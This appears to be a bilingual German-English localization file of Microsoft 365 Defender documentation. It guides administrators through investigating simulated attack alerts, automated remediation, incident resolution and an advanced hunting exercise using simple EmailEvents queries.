<span data-ttu-id="d8402-207">Wir verwenden umfangreiche Lernalgorithmen, um das normale Verhalten gängiger Prozesse innerhalb einer Organisation und weltweit zu ermitteln und zu beobachten, wann diese Prozesse anomales Verhalten aufweisen.</span><span class="sxs-lookup"><span data-stu-id="d8402-207">We employ large-scale learning algorithms to establish the normal behavior of common processes within an organization and worldwide and watch for when these processes show anomalous behaviors.</span></span> <span data-ttu-id="d8402-208">Diese anomaalen Verhaltensweisen weisen häufig darauf hin, dass fremder Code eingeführt wurde und in einem ansonsten vertrauenswürdigen Prozess ausgeführt wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-208">These anomalous behaviors often indicate that extraneous code was introduced and are running in an otherwise trusted process.</span></span>

<span data-ttu-id="d8402-209">In diesem Szenario weist der Prozess <i>notepad.exe</i> ein ungewöhnliches Verhalten auf, das die Kommunikation mit einem externen Standort einschließt.</span><span class="sxs-lookup"><span data-stu-id="d8402-209">For this scenario, the process <i>notepad.exe</i> is exhibiting abnormal behavior, involving communication with an external location.</span></span> <span data-ttu-id="d8402-210">Dieses Ergebnis ist unabhängig von der spezifischen Methode, die zum Einführen und Ausführen des schädlichen Codes verwendet wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-210">This outcome is independent of the specific method used to introduce and execute the malicious code.</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-211">Da diese Warnung auf Machine Learning-Modellen basiert, die eine zusätzliche Back-End-Verarbeitung erfordern, kann es einige Zeit dauern, bis diese Warnung im Portal angezeigt wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-211">Because this alert is based on machine-learning models that require additional backend processing, it might take some time before you see this alert in the portal.</span></span>

<span data-ttu-id="d8402-212">Beachten Sie, dass die Warnungsdetails die externe IP-Adresse enthalten – ein Indikator, den Sie als Pivot verwenden können, um die Untersuchung zu erweitern.</span><span class="sxs-lookup"><span data-stu-id="d8402-212">Notice that the alert details include the external IP address—an indicator that you can use as a pivot to expand investigation.</span></span>

<span data-ttu-id="d8402-213">Wählen Sie die IP-Adresse in der Warnungsprozessstruktur aus, um die Seite mit den IP-Adressdetails anzuzeigen.</span><span class="sxs-lookup"><span data-stu-id="d8402-213">Select the IP address in the alert process tree to view the IP address details page.</span></span>

![Screenshot der Warnung für unerwartetes Verhalten durch einen Prozess ohne Befehlszeilenargumente](../../media/mtp/fig8.png)

<span data-ttu-id="d8402-215">In der folgenden Abbildung wird die ausgewählte Seite mit den IP-Adressdetails angezeigt (klicken Sie in der Struktur des Warnungsprozesses auf die IP-Adresse).</span><span class="sxs-lookup"><span data-stu-id="d8402-215">The following figure displays the selected IP Address details page (clicking on IP address in the Alert process tree).</span></span>
<span data-ttu-id="d8402-216">![Screenshot der Seite "IP-Adressdetails"](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="d8402-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="d8402-217">Warnung: Benutzer- und IP-Adress-Reconnaissance (SMB) (Quelle: Microsoft Defender for Identity)</span><span class="sxs-lookup"><span data-stu-id="d8402-217">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="d8402-218">Die Aufzählung mithilfe des SMB-Protokolls (Server Message Block) ermöglicht Es Angreifern, aktuelle Benutzeranmeldeinformationen abzurufen, mit denen sie seitlich durch das Netzwerk navigieren können, um auf ein bestimmtes vertrauliches Konto zuzugreifen.</span><span class="sxs-lookup"><span data-stu-id="d8402-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="d8402-219">Bei dieser Erkennung wird eine Warnung ausgelöst, wenn die SMB-Sitzungsenumeration für einen Domänencontroller ausgeführt wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Screenshot der Microsoft Defender for Identity-Warnung für die Benutzer- und IP-Adressaufklärung](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="d8402-221">Überprüfen der Gerätezeitachse [Microsoft Defender für Endpunkt]</span><span class="sxs-lookup"><span data-stu-id="d8402-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>

<span data-ttu-id="d8402-222">Nachdem Sie die verschiedenen Warnungen in diesem Vorfall untersucht haben, navigieren Sie zurück zu der Vorfallseite, die Sie zuvor untersucht haben.</span><span class="sxs-lookup"><span data-stu-id="d8402-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="d8402-223">Wählen Sie die Registerkarte **"Geräte"** auf der Vorfallseite aus, um die an diesem Vorfall beteiligten Geräte zu überprüfen, wie von Microsoft Defender für Endpunkt und Microsoft Defender for Identity gemeldet.</span><span class="sxs-lookup"><span data-stu-id="d8402-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="d8402-224">Wählen Sie den Namen des Geräts aus, auf dem der Angriff ausgeführt wurde, um die Entitätsseite für dieses bestimmte Gerät zu öffnen.</span><span class="sxs-lookup"><span data-stu-id="d8402-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="d8402-225">Auf dieser Seite können Sie Warnungen sehen, die ausgelöst wurden, und verwandte Ereignisse.</span><span class="sxs-lookup"><span data-stu-id="d8402-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="d8402-226">Wählen Sie die Registerkarte **"Zeitachse"** aus, um die Gerätezeitachse zu öffnen und alle auf dem Gerät beobachteten Ereignisse und Verhaltensweisen in chronologischer Reihenfolge anzuzeigen, durchsetzt mit den ausgelösten Warnungen.</span><span class="sxs-lookup"><span data-stu-id="d8402-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Screenshot der Gerätezeitachse mit Verhalten](../../media/mtp/fig11.png)

<span data-ttu-id="d8402-228">Das Erweitern einiger der interessanteren Verhaltensweisen liefert nützliche Details, z. B. Prozessstrukturen.</span><span class="sxs-lookup"><span data-stu-id="d8402-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="d8402-229">Scrollen Sie beispielsweise nach unten, bis Sie das Warnungsereignis **"Verdächtige Prozessinjektion" gefunden haben.**</span><span class="sxs-lookup"><span data-stu-id="d8402-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="d8402-230">Wählen Sie diepowershell.exe aus, die **in notepad.exe Prozessereignis** darunter eingefügt wurde, um die vollständige Prozessstruktur für dieses Verhalten unter dem Diagramm **"Ereignisentitäten"** im Seitenbereich anzuzeigen.</span><span class="sxs-lookup"><span data-stu-id="d8402-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="d8402-231">Verwenden Sie bei Bedarf die Suchleiste zum Filtern.</span><span class="sxs-lookup"><span data-stu-id="d8402-231">Use the search bar for filtering if necessary.</span></span>

![Screenshot der Prozessstruktur für ausgewähltes PowerShell-Dateierstellungsverhalten](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="d8402-233">Überprüfen der Benutzerinformationen [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="d8402-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="d8402-234">Wählen Sie auf der Vorfallseite die Registerkarte **"Benutzer"** aus, um die Liste der an dem Angriff beteiligten Benutzer anzuzeigen.</span><span class="sxs-lookup"><span data-stu-id="d8402-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="d8402-235">Die Tabelle enthält zusätzliche Informationen zu jedem Benutzer, einschließlich der Bewertung der **Untersuchungspriorität** jedes Benutzers.</span><span class="sxs-lookup"><span data-stu-id="d8402-235">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="d8402-236">Wählen Sie den Benutzernamen aus, um die Profilseite des Benutzers zu öffnen, auf der weitere Untersuchungen durchgeführt werden können.</span><span class="sxs-lookup"><span data-stu-id="d8402-236">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="d8402-237">[Weitere Informationen zur Untersuchung riskanter Benutzer.](/cloud-app-security/tutorial-ueba#identify)</span><span class="sxs-lookup"><span data-stu-id="d8402-237">[Read more about investigating risky users](/cloud-app-security/tutorial-ueba#identify).</span></span>

![Screenshot Cloud App Security Benutzerseite](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="d8402-239">Automatische Untersuchung und Reaktion</span><span class="sxs-lookup"><span data-stu-id="d8402-239">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="d8402-240">Bevor wir Sie durch diese Simulation führen, sehen Sie sich das folgende Video an, um sich mit der automatisierten Selbstkorrektur vertraut zu machen, wo sie im Portal zu finden ist und wie sie bei Ihren Sicherheitsvorgängen helfen kann:</span><span class="sxs-lookup"><span data-stu-id="d8402-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="d8402-241">Navigieren Sie im Microsoft 365 Security Center-Portal zurück zu dem Vorfall.</span><span class="sxs-lookup"><span data-stu-id="d8402-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="d8402-242">Auf der Registerkarte **"Untersuchungen"** auf der **Seite "Vorfall"** werden die automatisierten Untersuchungen angezeigt, die von Microsoft Defender for Identity und Microsoft Defender für Endpunkt ausgelöst wurden.</span><span class="sxs-lookup"><span data-stu-id="d8402-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="d8402-243">Der screenshot unten zeigt nur die automatisierte Untersuchung, die von Defender für Endpunkt ausgelöst wurde.</span><span class="sxs-lookup"><span data-stu-id="d8402-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="d8402-244">Standardmäßig behebt Defender für Endpunkt automatisch die Artefakte in der Warteschlange, was eine Korrektur erfordert.</span><span class="sxs-lookup"><span data-stu-id="d8402-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Screenshot der automatisierten Untersuchungen im Zusammenhang mit dem Vorfall](../../media/mtp/fig14.png)

<span data-ttu-id="d8402-246">Wählen Sie die Warnung aus, die eine Untersuchung ausgelöst hat, um die Seite **"Untersuchungsdetails"** zu öffnen.</span><span class="sxs-lookup"><span data-stu-id="d8402-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="d8402-247">Die folgenden Details werden angezeigt:</span><span class="sxs-lookup"><span data-stu-id="d8402-247">You'll see the following details:</span></span>

- <span data-ttu-id="d8402-248">Warnungen, die die automatisierte Untersuchung ausgelöst haben.</span><span class="sxs-lookup"><span data-stu-id="d8402-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="d8402-249">Betroffene Benutzer und Geräte.</span><span class="sxs-lookup"><span data-stu-id="d8402-249">Impacted users and devices.</span></span> <span data-ttu-id="d8402-250">Wenn Indikatoren auf zusätzlichen Geräten gefunden werden, werden auch diese zusätzlichen Geräte aufgeführt.</span><span class="sxs-lookup"><span data-stu-id="d8402-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="d8402-251">Liste der Nachweise.</span><span class="sxs-lookup"><span data-stu-id="d8402-251">List of evidence.</span></span> <span data-ttu-id="d8402-252">Die gefundenen und analysierten Entitäten, z. B. Dateien, Prozesse, Dienste, Treiber und Netzwerkadressen.</span><span class="sxs-lookup"><span data-stu-id="d8402-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="d8402-253">Diese Entitäten werden auf mögliche Beziehungen zur Warnung analysiert und als gutartig oder bösartig eingestuft.</span><span class="sxs-lookup"><span data-stu-id="d8402-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="d8402-254">Bedrohungen gefunden.</span><span class="sxs-lookup"><span data-stu-id="d8402-254">Threats found.</span></span> <span data-ttu-id="d8402-255">Bekannte Bedrohungen, die während der Untersuchung gefunden werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-255">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-256">Je nach Zeitpunkt kann die automatisierte Untersuchung noch ausgeführt werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="d8402-257">Warten Sie einige Minuten, bis der Prozess abgeschlossen ist, bevor Sie die Nachweise sammeln und analysieren und die Ergebnisse überprüfen.</span><span class="sxs-lookup"><span data-stu-id="d8402-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="d8402-258">Aktualisieren Sie die **Seite "Untersuchungsdetails",** um die neuesten Ergebnisse zu erhalten.</span><span class="sxs-lookup"><span data-stu-id="d8402-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Screenshot der Seite "Untersuchungsdetails"](../../media/mtp/fig15.png)

<span data-ttu-id="d8402-260">Während der automatisierten Untersuchung hat Microsoft Defender für Endpunkt den notepad.exe Prozess identifiziert, der als eines der Artefakte eingefügt wurde, die eine Korrektur erfordern.</span><span class="sxs-lookup"><span data-stu-id="d8402-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="d8402-261">Defender für Endpunkt stoppt automatisch die verdächtige Prozesseinschleusung als Teil der automatisierten Korrektur.</span><span class="sxs-lookup"><span data-stu-id="d8402-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="d8402-262">Sie können <i> sehen,notepad.exe</i> aus der Liste der ausgeführten Prozesse auf dem Testgerät ausgeblendet werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="d8402-263">Beheben des Vorfalls</span><span class="sxs-lookup"><span data-stu-id="d8402-263">Resolve the incident</span></span>

<span data-ttu-id="d8402-264">Schließen Sie den Vorfall, nachdem die Untersuchung abgeschlossen und bestätigt wurde, dass sie behoben werden kann.</span><span class="sxs-lookup"><span data-stu-id="d8402-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="d8402-265">Wählen Sie **"Vorfall verwalten" aus.**</span><span class="sxs-lookup"><span data-stu-id="d8402-265">Select **Manage incident**.</span></span> <span data-ttu-id="d8402-266">Legen Sie den Status auf **"Vorfall beheben"** fest, und wählen Sie die entsprechende Klassifizierung aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="d8402-267">Wenn der Vorfall behoben ist, werden alle zugehörigen Warnungen im Microsoft 365 Security Center und in den zugehörigen Portalen geschlossen.</span><span class="sxs-lookup"><span data-stu-id="d8402-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Screenshot der Seite "Vorfälle" mit dem geöffneten Bereich "Vorfall verwalten", in dem Sie auf die Option zum Beheben von Vorfällen klicken können](../../media/mtp/fig16.png)

<span data-ttu-id="d8402-269">Dies schließt die Angriffssimulation für das Vorfallmanagement und automatisierte Untersuchungs- und Behebungsszenarien ein.</span><span class="sxs-lookup"><span data-stu-id="d8402-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="d8402-270">Die nächste Simulation führt Sie durch die proaktive Bedrohungssuche nach potenziell schädlichen Dateien.</span><span class="sxs-lookup"><span data-stu-id="d8402-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span>

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="d8402-271">Szenario "Erweiterte Suche"</span><span class="sxs-lookup"><span data-stu-id="d8402-271">Advanced hunting scenario</span></span>

> [!NOTE]
> <span data-ttu-id="d8402-272">Bevor wir Sie durch die Simulation führen, sehen Sie sich das folgende Video an, um die erweiterten Suchkonzepte zu verstehen, zu sehen, wo Sie sie im Portal finden können und wie sie Ihnen bei Ihren Sicherheitsvorgängen helfen kann:</span><span class="sxs-lookup"><span data-stu-id="d8402-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="d8402-273">Anforderungen an die Umgebungssuche</span><span class="sxs-lookup"><span data-stu-id="d8402-273">Hunting environment requirements</span></span>

<span data-ttu-id="d8402-274">Für dieses Szenario ist ein einzelnes internes Postfach und Gerät erforderlich.</span><span class="sxs-lookup"><span data-stu-id="d8402-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="d8402-275">Sie benötigen auch ein externes E-Mail-Konto, um die Testnachricht zu senden.</span><span class="sxs-lookup"><span data-stu-id="d8402-275">You'll also need an external email account to send the test message.</span></span>

1. <span data-ttu-id="d8402-276">Stellen Sie sicher, dass Ihr Mandant [Microsoft 365 Defender aktiviert](m365d-enable.md#confirm-that-the-service-is-on)hat.</span><span class="sxs-lookup"><span data-stu-id="d8402-276">Verify that your tenant has [enabled Microsoft 365 Defender](m365d-enable.md#confirm-that-the-service-is-on).</span></span>
2. <span data-ttu-id="d8402-277">Identifizieren Sie ein Zielpostfach, das für den Empfang von E-Mails verwendet werden soll.</span><span class="sxs-lookup"><span data-stu-id="d8402-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="d8402-278">a.</span><span class="sxs-lookup"><span data-stu-id="d8402-278">a.</span></span> <span data-ttu-id="d8402-279">Dieses Postfach muss von Microsoft Defender für Office 365 b überwacht werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span> <span data-ttu-id="d8402-280">Das Gerät aus Anforderung 3 muss auf dieses Postfach zugreifen.</span><span class="sxs-lookup"><span data-stu-id="d8402-280">The device from requirement 3 needs to access this mailbox</span></span>
3. <span data-ttu-id="d8402-281">Konfigurieren eines Testgeräts: a.</span><span class="sxs-lookup"><span data-stu-id="d8402-281">Configure a test device: a.</span></span> <span data-ttu-id="d8402-282">Stellen Sie sicher, dass Sie Windows 10 Version 1903 oder höher verwenden.</span><span class="sxs-lookup"><span data-stu-id="d8402-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="d8402-283">b.</span><span class="sxs-lookup"><span data-stu-id="d8402-283">b.</span></span> <span data-ttu-id="d8402-284">Verknüpfen Sie das Testgerät mit der Testdomäne.</span><span class="sxs-lookup"><span data-stu-id="d8402-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="d8402-285">c.</span><span class="sxs-lookup"><span data-stu-id="d8402-285">c.</span></span> <span data-ttu-id="d8402-286">[Aktivieren Sie Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="d8402-286">[Turn on Windows Defender Antivirus](/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="d8402-287">Wenn Sie Probleme beim Aktivieren von Windows Defender Antivirus haben, lesen Sie [dieses Problembehandlungsthema.](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy)</span><span class="sxs-lookup"><span data-stu-id="d8402-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="d8402-288">d.</span><span class="sxs-lookup"><span data-stu-id="d8402-288">d.</span></span> <span data-ttu-id="d8402-289">[Onboarding in Microsoft Defender für Endpunkt](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="d8402-289">[Onboard to Microsoft Defender for Endpoint](/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="d8402-290">Ausführen der Simulation</span><span class="sxs-lookup"><span data-stu-id="d8402-290">Run the simulation</span></span>

1. <span data-ttu-id="d8402-291">Senden Sie von einem externen E-Mail-Konto aus eine E-Mail an das postfach, das in Schritt 2 des Abschnitts mit den Anforderungen für die Testumgebung angegeben wurde.</span><span class="sxs-lookup"><span data-stu-id="d8402-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="d8402-292">Fügen Sie eine Anlage hinzu, die über alle vorhandenen E-Mail-Filterrichtlinien zulässig ist.</span><span class="sxs-lookup"><span data-stu-id="d8402-292">Include an attachment that will be allowed through any existing email filter policies.</span></span> <span data-ttu-id="d8402-293">Diese Datei muss nicht bösartig oder eine ausführbare Datei sein.</span><span class="sxs-lookup"><span data-stu-id="d8402-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="d8402-294">Vorgeschlagene Dateitypen sind <i>.pdf, </i> <i>.exe</i> (sofern zulässig) oder Office Dokument, z. B. eine Word-Datei.</span><span class="sxs-lookup"><span data-stu-id="d8402-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2. <span data-ttu-id="d8402-295">Öffnen Sie die gesendete E-Mail von dem Gerät, das gemäß der Definition in Schritt 3 des Abschnitts mit den Anforderungen an die Testumgebung konfiguriert ist.</span><span class="sxs-lookup"><span data-stu-id="d8402-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="d8402-296">Öffnen Sie die Anlage, oder speichern Sie die Datei auf dem Gerät.</span><span class="sxs-lookup"><span data-stu-id="d8402-296">Either open the attachment or save the file to the device.</span></span>

#### <a name="go-hunting"></a><span data-ttu-id="d8402-297">Suche gehen</span><span class="sxs-lookup"><span data-stu-id="d8402-297">Go hunting</span></span>

1. <span data-ttu-id="d8402-298">Öffnen Sie das security.microsoft.com-Portal.</span><span class="sxs-lookup"><span data-stu-id="d8402-298">Open the security.microsoft.com portal.</span></span>

2. <span data-ttu-id="d8402-299">Navigieren Sie zu **"Suche > Erweiterte Suche".**</span><span class="sxs-lookup"><span data-stu-id="d8402-299">Navigate to **Hunting > Advanced hunting**.</span></span>

   ![Screenshot der erweiterten Suche in der Navigationsleiste des M365 Security Center-Portals](../../media/mtp/fig17.png)

3. <span data-ttu-id="d8402-301">Erstellen Sie eine Abfrage, die mit dem Sammeln von E-Mail-Ereignissen beginnt.</span><span class="sxs-lookup"><span data-stu-id="d8402-301">Build a query that starts by gathering email events.</span></span>

   1. <span data-ttu-id="d8402-302">Wählen Sie im Abfragebereich "Neu" aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-302">From the query pane, select New.</span></span>

   1. <span data-ttu-id="d8402-303">Doppelklicken Sie im Schema auf die Tabelle EmailEvents.</span><span class="sxs-lookup"><span data-stu-id="d8402-303">Double-click on the EmailEvents table from the schema.</span></span>

      ```console
      EmailEvents
      ```

   1. <span data-ttu-id="d8402-304">Ändern Sie den Zeitrahmen in die letzten 24 Stunden.</span><span class="sxs-lookup"><span data-stu-id="d8402-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="d8402-305">Angenommen, die E-Mail, die Sie beim Ausführen der oben genannten Simulation gesendet haben, lag in den letzten 24 Stunden, andernfalls ändern Sie den Zeitrahmen.</span><span class="sxs-lookup"><span data-stu-id="d8402-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>

      ![Screenshot, an dem Sie den Zeitrahmen ändern können.](../../media/mtp/fig18.png)

   1. <span data-ttu-id="d8402-308">Führen Sie die Abfrage aus.</span><span class="sxs-lookup"><span data-stu-id="d8402-308">Run the query.</span></span> <span data-ttu-id="d8402-309">Abhängig von der Umgebung für das Pilotprojekt haben Sie möglicherweise viele Ergebnisse.</span><span class="sxs-lookup"><span data-stu-id="d8402-309">You may have many results depending on the environment for the pilot.</span></span>

      > [!NOTE]
      > <span data-ttu-id="d8402-310">Weitere Informationen zum Filtern von Optionen zum Einschränken der Datenrückgabe finden Sie im nächsten Schritt.</span><span class="sxs-lookup"><span data-stu-id="d8402-310">See the next step for filtering options to limit data return.</span></span>

      ![Screenshot der Abfrageergebnisse der erweiterten Suche](../../media/mtp/fig19.png)

        > [!NOTE]
        > <span data-ttu-id="d8402-312">Bei der erweiterten Suche werden Abfrageergebnisse als tabellarische Daten angezeigt.</span><span class="sxs-lookup"><span data-stu-id="d8402-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="d8402-313">Sie können die Daten auch in anderen Formattypen wie Diagrammen anzeigen.</span><span class="sxs-lookup"><span data-stu-id="d8402-313">You can also opt to view the data in other format types such as charts.</span></span>

   1. <span data-ttu-id="d8402-314">Sehen Sie sich die Ergebnisse an, und überprüfen Sie, ob Sie die geöffnete E-Mail identifizieren können.</span><span class="sxs-lookup"><span data-stu-id="d8402-314">Look at the results and see if you can identify the email you opened.</span></span> <span data-ttu-id="d8402-315">Es kann bis zu 2 Stunden dauern, bis die Nachricht in der erweiterten Suche angezeigt wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="d8402-316">Wenn die E-Mail-Umgebung groß ist und viele Ergebnisse vorliegen, können Sie die **Option "Filter anzeigen"** verwenden, um die Nachricht zu finden.</span><span class="sxs-lookup"><span data-stu-id="d8402-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span>

      <span data-ttu-id="d8402-317">Im Beispiel wurde die E-Mail von einem Yahoo-Konto gesendet.</span><span class="sxs-lookup"><span data-stu-id="d8402-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="d8402-318">Klicken Sie im **+** Abschnitt "SenderFromDomain" auf das Symbol neben **yahoo.com,** und klicken Sie dann auf **"Übernehmen",** um der Abfrage die ausgewählte Domäne hinzuzufügen.</span><span class="sxs-lookup"><span data-stu-id="d8402-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span> <span data-ttu-id="d8402-319">Verwenden Sie das Domänen- oder E-Mail-Konto, das zum Senden der Testnachricht in Schritt 1 von "Simulation ausführen" verwendet wurde, um Ihre Ergebnisse zu filtern.</span><span class="sxs-lookup"><span data-stu-id="d8402-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span> <span data-ttu-id="d8402-320">Führen Sie die Abfrage erneut aus, um ein kleineres Resultset abzurufen, um zu überprüfen, ob die Nachricht aus der Simulation angezeigt wird.</span><span class="sxs-lookup"><span data-stu-id="d8402-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>

      ![Screenshot der Filter.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. <span data-ttu-id="d8402-323">Klicken Sie auf die resultierenden Zeilen aus der Abfrage, damit Sie den Datensatz überprüfen können.</span><span class="sxs-lookup"><span data-stu-id="d8402-323">Click the resulting rows from the query so you can inspect the record.</span></span>

      ![Screenshot des Seitenbereichs "Datensatz überprüfen", der geöffnet wird, wenn ein Erweitertes Suchergebnis ausgewählt wird](../../media/mtp/fig21.png)

4. <span data-ttu-id="d8402-325">Nachdem Sie sich vergewissert haben, dass die E-Mail angezeigt wird, fügen Sie einen Filter für die Anlagen hinzu.</span><span class="sxs-lookup"><span data-stu-id="d8402-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="d8402-326">Konzentrieren Sie sich auf alle E-Mails mit Anlagen in der Umgebung.</span><span class="sxs-lookup"><span data-stu-id="d8402-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="d8402-327">Konzentrieren Sie sich für dieses Szenario auf eingehende E-Mails, nicht auf E-Mails, die aus Ihrer Umgebung gesendet werden.</span><span class="sxs-lookup"><span data-stu-id="d8402-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="d8402-328">Entfernen Sie alle Filter, die Sie hinzugefügt haben, um Ihre Nachricht zu suchen und "| wobei **AttachmentCount > 0** und **EmailDirection**  ==  **"Eingehend"**</span><span class="sxs-lookup"><span data-stu-id="d8402-328">Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**</span></span>

   <span data-ttu-id="d8402-329">In der folgenden Abfrage wird das Ergebnis mit einer kürzeren Liste angezeigt als die ursprüngliche Abfrage für alle E-Mail-Ereignisse:</span><span class="sxs-lookup"><span data-stu-id="d8402-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

